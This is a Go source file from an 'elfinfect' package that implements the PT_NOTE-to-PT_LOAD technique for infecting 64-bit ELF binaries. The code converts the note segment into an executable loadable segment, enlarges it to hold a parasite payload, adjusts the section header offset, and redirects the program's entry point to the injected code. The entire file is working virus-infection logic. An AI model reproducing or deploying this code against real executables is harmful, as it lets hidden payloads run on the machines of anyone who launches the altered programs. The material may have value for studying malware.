package elfinfect

import (
	"debug/elf"
	"errors"
	"fmt"
)

/*
	PT_NOTE -> PT_LOAD Steps
	1. Locate the data segment phdr:
		[a] - Find the address where the data segment ends.

		[b] - Find the file offset of the end of the data segment.

		[c] - Get the alignment size used for the loadable segment.

	2. Locate the PT_NOTE phdr:
		[a] - Convert phdr to PT_LOAD.

		[b] - Assign it starting address.
			dataSegEndAddr + dataAlignSize

		[c] Update newly created PT_NOTE file size and memory size to account for parasite.
*/

func (t *TargetBin) PtNoteToPtLoadInfection(debug bool, noRestoration bool, noRetOEP bool) error {
	//fmt.Println("Args")
	//fmt.Println("Args")
	//fmt.Printf("debug: %v\nnoRestoration: %v\nnoRetOEP: %v\n", debug, noRestoration, noRetOEP)
	//fmt.Println("Functionality is not implemented yet")
	//return nil

	var dataSegEndOff interface{}
	var dataSegEndAddr interface{}
	//var oShoff interface{}

	var dataNdx int
	var noteNdx int
	var dataAlignSize interface{}

	switch t.EIdent.Arch {
	case elf.ELFCLASS64:
		oEntry := t.Hdr.(*elf.Header64).Entry
		//oShoff = t.Hdr.(*elf.Header64).Shoff

		pHeaders := t.Phdrs.([]elf.Prog64)
		pNum := int(t.Hdr.(*elf.Header64).Phnum)
		numPtNote := 0

		for pHeaderNdx := 0; pHeaderNdx < pNum; pHeaderNdx++ {
			currentHeaderType := elf.ProgType(pHeaders[pHeaderNdx].Type)
			currentHeaderFlags := elf.ProgFlag(pHeaders[pHeaderNdx].Flags)
			if currentHeaderType == elf.PT_NOTE {
				numPtNote++
				noteNdx = pHeaderNdx
			}

			if numPtNote < 2 {
				if currentHeaderType == elf.PT_LOAD && currentHeaderFlags == (elf.PF_R|elf.PF_W) {
					dataNdx = pHeaderNdx
				}
			} else {
				return errors.New("Golang binaries are not supported for this algorithm")
			}
		}

		dataSegEndOff = pHeaders[dataNdx].Off + pHeaders[dataNdx].Filesz
		dataSegEndAddr = pHeaders[dataNdx].Vaddr + pHeaders[dataNdx].Memsz
		dataAlignSize = pHeaders[dataNdx].Align

		if debug {
			fmt.Printf("[+] Data segment pHeader index @ %d\n", dataNdx)
			fmt.Printf("[+] Data segment file offset ends @  0x%x\n", dataSegEndOff)
			fmt.Printf("[+] Data segment virtual address ends @ 0x%x\n", dataSegEndAddr)
			fmt.Printf("[+] Data segment alignment -> 0x%x\n", dataAlignSize)
			fmt.Printf("[+] PT_NOTE segment pHeader index @ %d\n", noteNdx)
		}

		if debug {
			fmt.Println("[+] Converting PT_NOTE to PT_LOAD and setting PERM R-X")
		}

		t.Phdrs.([]elf.Prog64)[noteNdx].Type = uint32(elf.PT_LOAD)
		t.Phdrs.([]elf.Prog64)[noteNdx].Flags = uint32(elf.PF_R | elf.PF_X)
		t.Phdrs.([]elf.Prog64)[noteNdx].Vaddr = dataSegEndAddr.(uint64) + dataAlignSize.(uint64)

		if debug {
			fmt.Printf("[+] Newly created PT_LOAD virtual address starts at 0x%x\n", t.Phdrs.([]elf.Prog64)[noteNdx].Vaddr)
		}

		plen := uint64(t.Payload.Len())

		t.Phdrs.([]elf.Prog64)[noteNdx].Filesz += plen
		t.Phdrs.([]elf.Prog64)[noteNdx].Memsz += plen

		if debug {
			fmt.Printf("[+] Increased Phdr.Filesz by length of payload (0x%x)\n", plen)
			fmt.Printf("[+] Increased Phdr.Memsz by length of payload (0x%x)\n", plen)
		}

		t.Hdr.(*elf.Header64).Shoff += plen

		if debug {
			fmt.Printf("[+] Increased section header offset from 0x%x to 0x%x to account for payload\n", (t.Hdr.(*elf.Header64).Shoff - plen), t.Hdr.(*elf.Header64).Shoff)
		}

		t.Hdr.(*elf.Header64).Entry = t.Phdrs.([]elf.Prog64)[noteNdx].Vaddr

		if debug {
			fmt.Printf("[+] Modifed entry point from 0x%x to 0x%x\n", oEntry, t.Hdr.(*elf.Header64).Entry)
		}

	case elf.ELFCLASS32:
		return errors.New("32 bit support for this alogorithm is not implemented yet")
	}

	return nil
}
